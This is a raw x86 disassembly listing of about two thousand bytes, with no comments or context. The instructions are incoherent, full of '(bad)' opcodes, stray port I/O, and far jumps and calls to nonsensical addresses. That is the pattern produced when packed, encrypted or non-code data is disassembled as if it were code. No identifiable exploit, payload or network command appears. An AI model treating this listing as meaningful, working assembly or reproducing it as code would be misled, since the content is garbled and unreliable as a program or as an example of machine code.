  41d69c:	das    
  41d69d:	nop
  41d69e:	rcr    bl,1
  41d6a0:	push   edi
  41d6a1:	jmp    0x41d645
  41d6a3:	stos   BYTE PTR es:[edi],al
  41d6a4:	icebp  
  41d6a5:	imul   DWORD PTR [ebx]
  41d6a7:	mov    ds,WORD PTR [esi-0x177823de]
  41d6ad:	dec    edi
  41d6ae:	push   eax
  41d6af:	mov    ds:0xc772cf22,eax
  41d6b4:	adc    ebp,DWORD PTR [ebp+0x32e981d]
  41d6ba:	mov    ebp,0x46ab19e2
  41d6bf:	or     bh,BYTE PTR [ebx+0x7a1f0dba]
  41d6c5:	pop    esp
  41d6c6:	aaa    
  41d6c7:	cmp    al,0xa8
  41d6c9:	add    eax,0xd0ee2729
  41d6ce:	inc    edi
  41d6cf:	jecxz  0x41d6fb
  41d6d1:	inc    esi
  41d6d2:	add    al,BYTE PTR [ebp-0x65d9bfe0]
  41d6d8:	jno    0x41d6a7
  41d6da:	mov    edi,0xdfe7ed0f
  41d6df:	imul   esp,DWORD PTR [ebp+0x439627e3],0x68
  41d6e6:	inc    ecx
  41d6e7:	xor    ch,dh
  41d6e9:	imul   esp,DWORD PTR [eax+edi*8+0x10eadd7],0xa
  41d6f1:	mov    ebx,0xf2e15dc8
  41d6f6:	xor    al,0x4b
  41d6f8:	mov    edi,0xa9c79a78
  41d6fd:	push   esi
  41d6fe:	or     al,0x38
  41d700:	lods   al,BYTE PTR ds:[esi]
  41d701:	mov    DWORD PTR [ebp+0x330a8793],edx
  41d707:	mov    ds:0x7d82c51c,al
  41d70c:	cmc    
  41d70d:	std    
  41d70e:	scas   al,BYTE PTR es:[edi]
  41d70f:	mov    cl,0xa3
  41d711:	mov    dh,0xb
  41d713:	imul   edi,DWORD PTR [ebp+0x67d58d4f],0xffffffe8
  41d71a:	lods   eax,DWORD PTR es:[esi]
  41d71c:	push   0xffffffaa
  41d71e:	mov    esp,0xdbfb6806
  41d723:	and    BYTE PTR [ecx-0x1a369aa6],0x51
  41d72a:	fdivr  DWORD PTR [edx]
  41d72c:	xlat   BYTE PTR ds:[ebx]
  41d72d:	frstor [eax-0x45]
  41d730:	push   0xda2501ef
  41d735:	jnp    0x41d72a
  41d737:	mov    ds:0xfaab8522,eax
  41d73c:	int    0xcc
  41d73e:	pop    ebp
  41d73f:	in     eax,0x1
  41d741:	test   eax,0x2285cbf2
  41d746:	push   0xe31682f8
  41d74b:	fidiv  DWORD PTR [ecx+0x7e7b538c]
  41d751:	add    DWORD PTR [edx],0xa0b35741
  41d757:	inc    esp
  41d758:	in     eax,dx
  41d759:	mov    eax,ds:0xa9477f38
  41d75e:	retf   
  41d75f:	cmp    eax,0xfc6fe196
  41d764:	xor    eax,0x1a246ad8
  41d769:	fs jnp 0x41d7c6
  41d76c:	xor    BYTE PTR [edi+ebp*2],ah
  41d76f:	cmp    eax,0x555bdec8
  41d774:	cli    
  41d775:	pusha  
  41d776:	stos   DWORD PTR es:[edi],eax
  41d777:	cld    
  41d778:	push   esi
  41d779:	call   0x6f18393e
  41d77e:	les    ebp,FWORD PTR [esp+ebp*8]
  41d781:	adc    cl,dl
  41d783:	jg     0x41d7c3
  41d785:	xlat   BYTE PTR ds:[ebx]
  41d786:	fbld   TBYTE PTR [eax+0x4610943c]
  41d78c:	in     al,0x43
  41d78e:	mov    al,0x6a
  41d790:	adc    DWORD PTR [ebx],0xffffffe3
  41d793:	add    bh,BYTE PTR [edi]
  41d795:	imul   ecx,ebp,0x8f0f6c6d
  41d79b:	test   DWORD PTR [ecx],edx
  41d79d:	imul   ebp,DWORD PTR [ebx],0x1
  41d7a0:	pop    esi
  41d7a1:	adc    ecx,DWORD PTR [eax]
  41d7a3:	mov    ds:0x3ef1eaaf,al
  41d7a8:	pop    esi
  41d7a9:	mov    edi,0x7918b874
  41d7ae:	inc    eax
  41d7af:	pop    ds
  41d7b0:	and    BYTE PTR [edx+edi*8+0x4d4e5a57],ch
  41d7b7:	outs   dx,DWORD PTR ds:[esi]
  41d7b8:	or     eax,0xbc7be110
  41d7bd:	push   esi
  41d7be:	inc    edi
  41d7bf:	xchg   ecx,eax
  41d7c0:	adc    eax,0x15b1b2c
  41d7c5:	sub    DWORD PTR [edi+0x165cab29],ebx
  41d7cb:	test   BYTE PTR [edi-0x7],bh
  41d7ce:	das    
  41d7cf:	xor    DWORD PTR [ebx],eax
  41d7d1:	out    dx,al
  41d7d2:	ja     0x41d767
  41d7d4:	pop    ebx
  41d7d5:	cdq    
  41d7d6:	nop    DWORD PTR [edx*2-0x570dda34]
  41d7de:	jmp    0xd6831803
  41d7e3:	imul   bh
  41d7e5:	mov    esp,0xb788bbbc
  41d7ea:	and    eax,0xad1bb530
  41d7ef:	out    0x81,eax
  41d7f1:	mov    eax,0xc2805b7
  41d7f6:	mov    ecx,0xbb6c2ae9
  41d7fb:	cdq    
  41d7fc:	jg     0x41d87d
  41d7fe:	push   ebx
  41d7ff:	sub    DWORD PTR [ebp+esi*4-0x5e73914],ebx
  41d806:	scas   eax,DWORD PTR es:[edi]
  41d807:	(bad)  
  41d808:	push   esp
  41d809:	rol    DWORD PTR [esi],0xba
  41d80c:	or     ah,dl
  41d80e:	test   al,0xb4
  41d810:	push   edx
  41d811:	sub    BYTE PTR [ebx],bl
  41d813:	push   0xffffffe5
  41d815:	stos   DWORD PTR es:[edi],eax
  41d816:	mov    al,0x88
  41d818:	and    al,0xb1
  41d81a:	xchg   DWORD PTR [edx+0x1bb30f6c],ebp
  41d820:	ja     0x41d861
  41d822:	dec    esp
  41d823:	fwait
  41d824:	fwait
  41d825:	test   eax,0x866ec2ee
  41d82a:	push   esi
  41d82b:	mov    al,0x8c
  41d82d:	call   0x4f55:0x5aff10d5
  41d834:	stc    
  41d835:	jmp    0x41d824
  41d837:	and    ecx,DWORD PTR [eax-0x75]
  41d83a:	jns    0x41d8a0
  41d83c:	jnp    0x41d83a
  41d83e:	ror    BYTE PTR [edx-0x6db126d4],cl
  41d844:	mov    ds:0x287445d5,al
  41d849:	dec    esi
  41d84a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d84b:	pop    edi
  41d84c:	retf   0x505b
  41d84f:	xor    dh,bl
  41d851:	jae    0x41d7e8
  41d853:	jmp    0x41d893
  41d855:	(bad)  
  41d856:	mov    dl,0x18
  41d858:	add    ecx,DWORD PTR [edi-0xf]
  41d85b:	out    dx,al
  41d85c:	std    
  41d85d:	mov    bh,0x20
  41d85f:	mov    ah,0x79
  41d861:	test   BYTE PTR [edi],ch
  41d863:	fldenv [esi+0x3b]
  41d867:	ror    BYTE PTR [ecx],cl
  41d869:	dec    edx
  41d86a:	sub    al,0x79
  41d86c:	ja     0x41d8db
  41d86e:	fld    QWORD PTR [edx]
  41d870:	xchg   ebx,eax
  41d871:	push   esp
  41d872:	cmp    al,0xd0
  41d874:	(bad)  
  41d875:	and    al,0xd
  41d877:	scas   eax,DWORD PTR es:[edi]
  41d878:	in     eax,0x7e
  41d87a:	call   FWORD PTR [esi-0xb1aaa4c]
  41d880:	mov    ecx,0x8f6cca24
  41d885:	mov    BYTE PTR [edx-0x5],ch
  41d888:	dec    ebx
  41d889:	push   es
  41d88a:	mov    DWORD PTR [ebx+edx*2+0x4112e524],edi
  41d891:	js     0x41d8f7
  41d893:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41d895:	fidivr DWORD PTR [ecx]
  41d897:	lods   eax,DWORD PTR ds:[esi]
  41d898:	and    cl,ah
  41d89a:	adc    eax,0xb5eb7908
  41d89f:	jbe    0x41d8ea
  41d8a1:	popf   
  41d8a2:	aaa    
  41d8a3:	dec    edx
  41d8a4:	xor    cl,cl
  41d8a6:	neg    ah
  41d8a8:	(bad)  
  41d8a9:	in     eax,dx
  41d8aa:	xchg   DWORD PTR [edx],esi
  41d8ac:	jge    0x41d8e9
  41d8ae:	push   ds
  41d8af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8b0:	into   
  41d8b1:	mov    ds:0x91f1c889,al
  41d8b6:	ins    BYTE PTR es:[edi],dx
  41d8b7:	into   
  41d8b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8b9:	iret   
  41d8ba:	ss adc al,0x9b
  41d8bd:	inc    esp
  41d8be:	push   cs
  41d8bf:	mov    ebp,0x85708636
  41d8c4:	aas    
  41d8c5:	iret   
  41d8c6:	jmp    0xd4310277
  41d8cb:	pop    DWORD PTR [eax-0x18aded75]
  41d8d1:	add    bh,BYTE PTR [edi]
  41d8d3:	and    DWORD PTR ds:0x2314b8b7,ebx
  41d8d9:	mov    ah,0x2f
  41d8db:	push   esp
  41d8dc:	push   ebp
  41d8dd:	jl     0x41d8ff
  41d8df:	std    
  41d8e0:	(bad)  
  41d8e1:	ror    esp,cl
  41d8e3:	adc    eax,0x4a1f42da
  41d8e8:	jl     0x41d879
  41d8ea:	mov    ecx,0xcdf8e20d
  41d8ef:	hlt    
  41d8f0:	push   0x53
  41d8f2:	and    DWORD PTR [eax],0x6d
  41d8f5:	inc    edx
  41d8f6:	je     0x41d895
  41d8f8:	aaa    
  41d8f9:	sub    al,0x1c
  41d8fb:	ret    0xe6b5
  41d8fe:	mov    BYTE PTR [eax+0x49b885c1],bh
  41d904:	mov    esp,es
  41d906:	jnp    0x41d8b9
  41d908:	test   al,0x2d
  41d90a:	mov    ecx,ebx
  41d90c:	jle    0x41d92c
  41d90e:	shl    DWORD PTR [edx-0x3223873b],1
  41d914:	icebp  
  41d915:	jae    0x41d98e
  41d917:	inc    eax
  41d918:	jl     0x41d978
  41d91a:	aad    0xf4
  41d91c:	stos   BYTE PTR es:[di],al
  41d91e:	jge    0x41d8f9
  41d920:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d921:	int    0xa9
  41d923:	mov    WORD PTR [esi-0x9dc43cc],gs
  41d929:	dec    ebx
  41d92a:	sbb    eax,0x819fdfec
  41d92f:	mov    cl,BYTE PTR [esi]
  41d931:	inc    ebp
  41d932:	popa   
  41d933:	daa    
  41d934:	sar    ebp,0x7d
  41d937:	or     al,0xcf
  41d939:	bound  edx,QWORD PTR [eax+0x53af2f29]
  41d93f:	ja     0x41d98d
  41d941:	repz mov eax,cs:0x7c00ceda
  41d948:	xor    eax,0x4b5467e8
  41d94d:	mov    esi,0xec59308
  41d952:	mov    al,ds:0x27e0871a
  41d957:	mov    al,0xe
  41d959:	aaa    
  41d95a:	das    
  41d95b:	mov    dl,dl
  41d95d:	xchg   ebx,eax
  41d95e:	clc    
  41d95f:	push   ds
  41d960:	push   esp
  41d961:	pop    ecx
  41d962:	cmp    DWORD PTR [edi+ecx*1-0x25b89956],eax
  41d969:	pop    ebx
  41d96a:	or     al,0x4c
  41d96c:	and    esp,DWORD PTR [edx+0x30]
  41d96f:	bnd jnp 0x41d939
  41d972:	xchg   DWORD PTR [esp+edx*2],ecx
  41d975:	push   cs
  41d976:	repnz dec edi
  41d978:	jmp    0x41d9c5
  41d97a:	ret    0x7152
  41d97d:	sbb    ecx,ebx
  41d97f:	xor    DWORD PTR [eax-0x4ac07b6e],0xffffff97
  41d986:	and    ebx,DWORD PTR [edx-0x74]
  41d989:	or     al,0xf3
  41d98b:	inc    ebp
  41d98c:	ja     0x41d97a
  41d98e:	inc    ebx
  41d98f:	jae    0x41d913
  41d991:	jmp    0x41d997
  41d993:	imul   ebx,DWORD PTR [edi-0x4ed45e49],0x1
  41d99a:	and    DWORD PTR [esp+eiz*8-0x1479f3a8],ebx
  41d9a1:	dec    ebx
  41d9a2:	(bad)  
  41d9a3:	xlat   BYTE PTR ds:[ebx]
  41d9a4:	cmp    dh,BYTE PTR [esi-0x14]
  41d9a7:	cdq    
  41d9a8:	adc    DWORD PTR [eax],esp
  41d9aa:	bound  ecx,QWORD PTR [ebp-0x179bee41]
  41d9b0:	into   
  41d9b1:	inc    ebx
  41d9b2:	push   0xffffffaf
  41d9b4:	mov    BYTE PTR [eax+0x35],cl
  41d9b7:	pop    ebp
  41d9b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9b9:	add    edx,DWORD PTR [edi+0x19]
  41d9bc:	sbb    ebp,ebx
  41d9be:	retf   
  41d9bf:	loopne 0x41d994
  41d9c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9c2:	inc    ebx
  41d9c3:	xor    eax,0xbde5422
  41d9c8:	mov    eax,ecx
  41d9ca:	in     al,dx
  41d9cb:	cmp    eax,0x799668d0
  41d9d0:	push   cs
  41d9d1:	data16 loop 0x41d9e0
  41d9d4:	mov    WORD PTR [edi-0x39],fs
  41d9d7:	fidiv  DWORD PTR [edi]
  41d9d9:	cmc    
  41d9da:	add    esi,ebx
  41d9dc:	sub    eax,ebx
  41d9de:	mov    edi,0xa14fd526
  41d9e3:	fcomp  st(6)
  41d9e5:	xor    ebp,esi
  41d9e7:	(bad)  
  41d9e8:	ins    BYTE PTR es:[edi],dx
  41d9e9:	and    eax,DWORD PTR [edi+0x240fa056]
  41d9ef:	out    dx,eax
  41d9f0:	sub    BYTE PTR [ebx+0x5b],0x71
  41d9f4:	pop    esi
  41d9f5:	or     eax,0x403c5e5d
  41d9fa:	je     0x41da5f
  41d9fc:	lods   eax,DWORD PTR ds:[esi]
  41d9fd:	jmp    0x41da5f
  41d9ff:	pop    eax
  41da00:	out    dx,al
  41da01:	test   al,0x96
  41da03:	sub    eax,0x9b737186
  41da08:	adc    ebp,DWORD PTR [esi+0x39]
  41da0b:	test   BYTE PTR [edx],cl
  41da0d:	jecxz  0x41d9b4
  41da0f:	or     bl,ah
  41da11:	aam    0xf3
  41da13:	mov    al,BYTE PTR [ebx]
  41da15:	dec    esi
  41da16:	out    0xda,eax
  41da18:	xchg   ebp,eax
  41da19:	adc    ah,BYTE PTR [ebp-0x64802011]
  41da1f:	mov    ds:0x18bf1751,eax
  41da24:	mov    ch,0x4a
  41da26:	inc    esp
  41da27:	or     edx,edx
  41da29:	push   eax
  41da2a:	xchg   edx,eax
  41da2b:	or     BYTE PTR [eax-0x6f141d8b],cl
  41da31:	jmp    0x5aa:0xfc129459
  41da38:	retf   
  41da39:	cmp    eax,0x6c671595
  41da3e:	mov    esi,0x96f4a5c3
  41da43:	fild   DWORD PTR [ebp-0x58]
  41da46:	add    eax,0x416b2eca
  41da4b:	out    dx,al
  41da4c:	push   ds
  41da4d:	sub    edx,DWORD PTR [ecx-0x32]
  41da50:	fld    st(6)
  41da52:	mov    ebp,0xe1703e60
  41da57:	or     BYTE PTR [ebx],bl
  41da59:	mov    dh,0xfb
  41da5b:	mov    ds,ecx
  41da5d:	popf   
  41da5e:	mov    edx,esp
  41da60:	push   ss
  41da61:	dec    esi
  41da62:	pushf  
  41da63:	xor    BYTE PTR [edx-0x552e9b91],dl
  41da69:	dec    esi
  41da6a:	fst    DWORD PTR [ecx+0x52c110db]
  41da70:	arpl   WORD PTR [ebx+0x2adcfc5],cx
  41da76:	not    DWORD PTR [edi]
  41da78:	bound  esp,QWORD PTR [edx-0x44b5a489]
  41da7e:	xchg   DWORD PTR [esi+edx*8+0x50],ebp
  41da82:	dec    ebp
  41da83:	cmp    DWORD PTR [ecx-0x28],0x468498c8
  41da8a:	out    dx,al
  41da8b:	mov    ebx,0x16b20ea8
  41da90:	and    DWORD PTR [ecx+0x562199d3],esp
  41da96:	call   0x6d61279e
  41da9b:	out    dx,eax
  41da9c:	dec    edi
  41da9d:	imul   esi,DWORD PTR [esp+ecx*8-0x7b184161],0xffffffaf
  41daa5:	ss mov esp,0x105e91f3
  41daab:	and    edi,DWORD PTR [ecx]
  41daad:	jmp    0x31094969
  41dab2:	cmp    cl,al
  41dab4:	arpl   WORD PTR [eax-0x1f9f8555],cx
  41daba:	add    al,0x74
  41dabc:	jle    0x41da6e
  41dabe:	les    esp,FWORD PTR [ebp+esi*2+0x1905a8f2]
  41dac5:	pop    es
  41dac6:	xchg   edi,eax
  41dac7:	sub    bl,BYTE PTR [eax+0x4f]
  41daca:	int3   
  41dacb:	fcomip st,st(0)
  41dacd:	adc    cl,0x9e
  41dad0:	ficomp DWORD PTR [ecx]
  41dad2:	pop    es
  41dad3:	and    BYTE PTR [ebp-0x1c224bf0],dl
  41dad9:	adc    esp,DWORD PTR [esi]
  41dadb:	cmp    dl,cl
  41dadd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dade:	jo     0x41da95
  41dae0:	mov    ecx,0x1f0384b1
  41dae5:	add    DWORD PTR [ecx],edx
  41dae7:	jns    0x41db3d
  41dae9:	ds sbb bh,bl
  41daec:	or     esp,edi
  41daee:	cmc    
  41daef:	pop    ebp
  41daf0:	mov    bh,0xa
  41daf2:	retf   0xc16a
  41daf5:	fnstenv [edi+ebp*2+0x44c81781]
  41dafc:	dec    ecx
  41dafd:	rol    DWORD PTR [edx-0x65],cl
  41db00:	push   es
  41db01:	repz pop ss
  41db03:	outs   dx,BYTE PTR ds:[esi]
  41db04:	cmc    
  41db05:	stc    
  41db06:	shl    bh,cl
  41db08:	mov    bl,0xdb
  41db0a:	nop
  41db0b:	xchg   ebx,eax
  41db0c:	std    
  41db0d:	daa    
  41db0e:	or     BYTE PTR [ecx],dl
  41db10:	inc    ebp
  41db11:	and    esi,DWORD PTR [eax+ebx*8-0x8af60e0]
  41db18:	mov    dh,0xa3
  41db1a:	je     0x41db3c
  41db1c:	push   ebx
  41db1d:	push   0x49
  41db1f:	cwde   
  41db20:	data16 fidiv WORD PTR [edx+0x65]
  41db24:	scas   al,BYTE PTR es:[edi]
  41db25:	push   ss
  41db26:	pop    eax
  41db27:	sub    DWORD PTR [ebp-0x7b],0xed9cc6cf
  41db2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db2f:	mov    ebx,0xd4d2169b
  41db34:	test   eax,0x91d1b004
  41db39:	or     eax,0x3dfe78ff
  41db3e:	jg     0x41db02
  41db40:	add    al,0xf3
  41db42:	retfw  
  41db44:	(bad)  
  41db45:	fadd   st(4),st
  41db47:	dec    edx
  41db48:	data16 into 
  41db4a:	imul   BYTE PTR [ecx]
  41db4c:	adc    dh,ch
  41db4e:	mov    al,0x12
  41db50:	xchg   edx,eax
  41db51:	loope  0x41dbbb
  41db53:	(bad)
  41db56:	pop    ebp
  41db57:	jno    0x41db7c
  41db59:	aam    0x1b
  41db5b:	lods   al,BYTE PTR ds:[esi]
  41db5c:	test   DWORD PTR [ecx+0x4c],0x1c14088
  41db63:	lds    esi,FWORD PTR [ebx-0x275b75f3]
  41db69:	mov    ebx,0xad64eca8
  41db6e:	and    DWORD PTR [eax+0x4b],0x90c5688f
  41db75:	push   0xfffffff3
  41db77:	cmc    
  41db78:	lock out dx,al
  41db7a:	ins    WORD PTR es:[edi],dx
  41db7c:	push   eax
  41db7d:	pop    esi
  41db7e:	into   
  41db7f:	fwait
  41db80:	push   ebx
  41db81:	imul   ebp,DWORD PTR [esi+edi*2-0x34c9f355],0xffffffd8
  41db89:	or     BYTE PTR [edx+0x1a324041],ch
  41db8f:	retf   0x4f65
  41db92:	pusha  
  41db93:	mov    esp,0x3439811
  41db98:	mov    bl,0x1f
  41db9a:	out    dx,al
  41db9b:	or     ch,dl
  41db9d:	(bad)  [edx-0x18592d6c]
  41dba3:	xor    BYTE PTR [ecx+0x1d1d254b],bl
  41dba9:	xchg   ebx,eax
  41dbaa:	mov    al,ds:0x5bb6dd62
  41dbaf:	sbb    al,0x3c
  41dbb1:	cmp    DWORD PTR [ecx-0x38],0x7c26a56
  41dbb8:	fwait
  41dbb9:	stc    
  41dbba:	aad    0xc6
  41dbbc:	pop    ebp
  41dbbd:	mov    edi,0x895ac88c
  41dbc2:	sbb    al,0x73
  41dbc4:	pop    esi
  41dbc5:	les    ebx,FWORD PTR [ebx-0xd876759]
  41dbcb:	js     0x41dc1a
  41dbcd:	loopne 0x41dc25
  41dbcf:	jge    0x41dc1a
  41dbd1:	push   cs
  41dbd2:	js     0x41db81
  41dbd4:	pop    eax
  41dbd5:	lock aad 0x40
  41dbd8:	mov    DWORD PTR [ebp+0x67],ecx
  41dbdb:	push   0x402eac5b
  41dbe0:	and    edx,DWORD PTR [eax+0x63]
  41dbe3:	jge    0x41dc29
  41dbe5:	jle    0x41db8a
  41dbe7:	xor    ebx,DWORD PTR [ecx+0x5c]
  41dbea:	cmp    al,0xdd
  41dbec:	inc    ecx
  41dbed:	sub    ch,BYTE PTR [ecx-0x1824faf7]
  41dbf3:	stc    
  41dbf4:	fistp  DWORD PTR [edi]
  41dbf6:	push   ecx
  41dbf7:	addr16 clc 
  41dbf9:	mov    cl,0x58
  41dbfb:	adc    ah,BYTE PTR [ebp+ebx*8+0x4]
  41dbff:	adc    al,0x27
  41dc01:	dec    ebp
  41dc02:	inc    esi
  41dc03:	or     DWORD PTR [ebx+0x6d],eax
  41dc06:	add    BYTE PTR [eax-0x7419a3d9],ch
  41dc0c:	or     BYTE PTR [edx+0x5f8569aa],0x14
  41dc13:	popa   
  41dc14:	icebp  
  41dc15:	ret    
  41dc16:	aad    0xa2
  41dc18:	(bad)  
  41dc1a:	and    BYTE PTR [eax-0xc3586d6],dh
  41dc20:	xor    BYTE PTR [edx-0x20],bl
  41dc23:	and    al,BYTE PTR [esp+ebp*1-0x54eb558]
  41dc2a:	mov    ds:0xefe5c4be,al
  41dc2f:	mov    ebx,0xaf0bd499
  41dc34:	js     0x41dc91
  41dc36:	cmp    ecx,DWORD PTR [esi]
  41dc38:	stc    
  41dc39:	cmp    dl,BYTE PTR [ecx+eax*2+0x3bee55f3]
  41dc40:	pushf  
  41dc41:	push   esp
  41dc42:	aam    0xf5
  41dc44:	enter  0x1eb7,0x4e
  41dc48:	jb     0x41dc87
  41dc4a:	pop    ds
  41dc4b:	sbb    eax,0xbe57c65d
  41dc50:	stos   BYTE PTR es:[edi],al
  41dc51:	sbb    al,0x34
  41dc53:	add    bh,BYTE PTR [edx]
  41dc55:	and    al,bh
  41dc57:	inc    esi
  41dc58:	mov    bl,0x5
  41dc5a:	mov    edx,0x5c10d33a
  41dc5f:	jl     0x41dc19
  41dc61:	loop   0x41dc83
  41dc63:	stc    
  41dc64:	push   ds
  41dc65:	clc    
  41dc66:	and    cl,BYTE PTR [ecx-0x4c44d5c7]
  41dc6c:	xchg   BYTE PTR [edx-0x1244e2ea],ch
  41dc72:	push   ebp
  41dc73:	inc    ecx
  41dc74:	pusha  
  41dc75:	scas   eax,DWORD PTR es:[edi]
  41dc76:	add    DWORD PTR [ebp+0x3],edi
  41dc79:	les    edx,FWORD PTR [edi+0x3e]
  41dc7c:	mov    edx,0x6897a2d0
  41dc81:	add    esi,DWORD PTR [esi-0x1b843900]
  41dc87:	mov    ecx,0xdee10ea6
  41dc8c:	fiadd  DWORD PTR [edx+eiz*2]
  41dc8f:	mov    ebp,0x9113ac03
  41dc94:	in     al,dx
  41dc95:	pop    esi
  41dc96:	fdivr  QWORD PTR es:[esi+0xb]
  41dc9a:	and    al,0xd8
  41dc9c:	inc    ecx
  41dc9d:	mov    esi,DWORD PTR [eax+esi*2]
  41dca0:	or     BYTE PTR [ecx],0x1d
  41dca3:	push   es
  41dca4:	mov    edx,0x1db620ab
  41dca9:	test   DWORD PTR [ebx+0x40],edx
  41dcac:	sbb    BYTE PTR [ebx-0xe],al
  41dcaf:	sbb    al,0x8b
  41dcb1:	mov    ah,0xb3
  41dcb3:	pop    ss
  41dcb4:	out    dx,al
  41dcb5:	outs   dx,BYTE PTR ds:[esi]
  41dcb6:	and    al,bh
  41dcb8:	add    dl,BYTE PTR [ecx+edx*2]
  41dcbb:	out    0xc5,al
  41dcbd:	sub    BYTE PTR [esi+eiz*2-0x53757b],bl
  41dcc4:	mov    DWORD PTR [edx+0x36],edx
  41dcc7:	mov    ebp,DWORD PTR fs:[eax-0x4648b300]
  41dcce:	cwde   
  41dccf:	xchg   BYTE PTR [edi+0x65911e42],dl
  41dcd5:	inc    ebp
  41dcd6:	outs   dx,DWORD PTR ds:[esi]
  41dcd7:	shl    BYTE PTR [ebx+0x1ef5578],0x94
  41dcde:	aam    0xc4
  41dce0:	xchg   ecx,eax
  41dce1:	add    al,0x7e
  41dce3:	aam    0xa4
  41dce5:	and    al,0xbf
  41dce7:	sbb    eax,0x60811454
  41dcec:	jp     0x41dcbf
  41dcee:	sub    al,0x91
  41dcf0:	and    esp,DWORD PTR [eax+0x9]
  41dcf3:	mov    esi,0x79027952
  41dcf8:	mov    bl,0xa3
  41dcfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcfb:	add    al,0xb0
  41dcfd:	inc    ecx
  41dcfe:	shl    BYTE PTR [eax+0x11],cl
  41dd01:	push   cs
  41dd02:	fwait
  41dd03:	adc    esi,DWORD PTR [ebx+0x4e0e879c]
  41dd09:	add    al,cl
  41dd0b:	pop    es
  41dd0c:	add    esi,ebp
  41dd0e:	clc    
  41dd0f:	sub    ah,dh
  41dd11:	pop    ds
  41dd12:	jmp    0x41dce3
  41dd14:	sbb    cl,al
  41dd16:	mov    dl,0x99
  41dd18:	aad    0x54
  41dd1a:	add    ebx,eax
  41dd1c:	add    ch,BYTE PTR [esi-0x524312a5]
  41dd22:	dec    ebp
  41dd23:	and    dl,dh
  41dd25:	ins    DWORD PTR es:[edi],dx
  41dd26:	arpl   WORD PTR [edx],sp
  41dd28:	nop
  41dd29:	in     al,0xc9
  41dd2b:	retf   0xd8a6
  41dd2e:	lds    esp,FWORD PTR [edx]
  41dd30:	mov    edx,0xbdea5975
  41dd35:	shr    DWORD PTR [eax+0x23973e38],cl
  41dd3b:	mov    ebp,0xb03e2639
  41dd40:	or     al,0x3a
  41dd42:	repnz sub dh,bl
  41dd45:	jo     0x41dda1
  41dd47:	inc    eax
  41dd48:	data16 jo 0x41ddb3
  41dd4b:	mov    al,ds:0x7a1aab22
  41dd50:	pop    ebp
  41dd51:	sub    dl,BYTE PTR [esi+0x354a2c2c]
  41dd57:	or     al,BYTE PTR [edx+0x5]
  41dd5a:	pop    ecx
  41dd5b:	inc    esp
  41dd5c:	cmp    DWORD PTR [edi+0x77],eax
  41dd5f:	(bad)  
  41dd60:	iret   
  41dd61:	mov    DWORD PTR ds:0xd9c62191,edi
  41dd67:	sub    BYTE PTR [esi+0xa],ch
  41dd6a:	and    dh,BYTE PTR [ebx]
  41dd6c:	pop    esp
  41dd6d:	or     esi,DWORD PTR [eax-0x6dfbbad0]
  41dd73:	xor    eax,0xd2665a9b
  41dd78:	out    0x1c,eax
  41dd7a:	mov    edi,0xdb6646c6
  41dd7f:	push   ebp
  41dd80:	mov    al,0xb4
  41dd82:	(bad)  
  41dd83:	jl     0x41dde5
  41dd85:	cwde   
  41dd86:	popa   
  41dd87:	inc    esi
  41dd88:	cmc    
  41dd89:	inc    ebp
  41dd8a:	sbb    al,BYTE PTR [ecx+0x68]
  41dd8d:	push   edx
  41dd8e:	sub    BYTE PTR ds:0x209ac62,dh
  41dd94:	loopne 0x41dd39
  41dd96:	sbb    DWORD PTR [eax-0x239a2869],ebx
  41dd9c:	shr    DWORD PTR [ecx+0x6757dc5d],cl
  41dda2:	xlat   BYTE PTR ds:[ebx]
  41dda3:	fwait
  41dda4:	addr16 retf 
  41dda6:	rcl    edi,cl
  41dda8:	rcr    DWORD PTR [ebx-0x5ae09bda],0x7f
  41ddaf:	cmp    eax,0x5d656e81
  41ddb4:	pop    es
  41ddb5:	jge    0x41ddc1
  41ddb7:	in     al,0xc5
  41ddb9:	ins    BYTE PTR es:[edi],dx
  41ddba:	lahf   
  41ddbb:	mov    DWORD PTR [eax-0x18146bd3],ebx
  41ddc1:	or     DWORD PTR [ebp-0x22],esi
  41ddc4:	pop    eax
  41ddc5:	inc    esp
  41ddc6:	(bad)  
  41ddc7:	jbe    0x41de02
  41ddc9:	and    edx,0xc7993c61
  41ddcf:	xchg   esi,eax
  41ddd0:	add    eax,0xaaa02e97
  41ddd5:	icebp  
  41ddd6:	jle    0x41de0d
  41ddd8:	or     dh,bh
  41ddda:	sub    BYTE PTR [ecx],bl
  41dddc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dddd:	nop
  41ddde:	jno    0x41ddc8
  41dde0:	call   0x12c1:0xe27f9900
  41dde7:	sbb    eax,0x6cd7d7a8
  41ddec:	pop    ss
  41dded:	(bad)  
  41ddee:	loope  0x41de1b
  41ddf0:	test   eax,0xad48e444
  41ddf5:	push   ebx
  41ddf6:	(bad)  
  41ddf7:	ja     0x41de59
  41ddf9:	mov    ebx,0xd80dcca2
  41ddfe:	dec    ebp
  41ddff:	pusha  
  41de00:	push   ss
  41de01:	jp     0x41de2c
  41de03:	inc    eax
  41de04:	aaa    
  41de05:	mov    BYTE PTR [esi+eax*2-0x43],0xaa
  41de0a:	leave  
  41de0b:	cdq    
  41de0c:	lea    ebx,[ecx]
  41de0e:	xlat   BYTE PTR ds:[ebx]
  41de0f:	es dec edi
  41de11:	cdq    
  41de12:	dec    ecx
  41de13:	sbb    ebx,eax
  41de15:	inc    ebp
  41de16:	(bad)  
  41de17:	lea    esi,[ebx-0x12]
  41de1a:	div    edi
  41de1c:	push   esi
  41de1d:	pop    ecx
  41de1e:	das    
  41de1f:	imul   ecx,esp,0x53fbc7ae
  41de25:	outs   dx,DWORD PTR ds:[esi]
  41de26:	push   ss
  41de27:	mov    dl,0xd7
  41de29:	shr    DWORD PTR [ecx-0xb],1
  41de2c:	js     0x41de5a
  41de2e:	(bad)  
  41de2f:	mov    cl,0xc
  41de31:	sub    al,0xe3
  41de33:	fst    DWORD PTR [ebp-0x3051b38e]
  41de39:	pop    ds
  41de3a:	scas   eax,DWORD PTR es:[edi]
  41de3b:	lea    eax,[ebx-0x13302a5c]
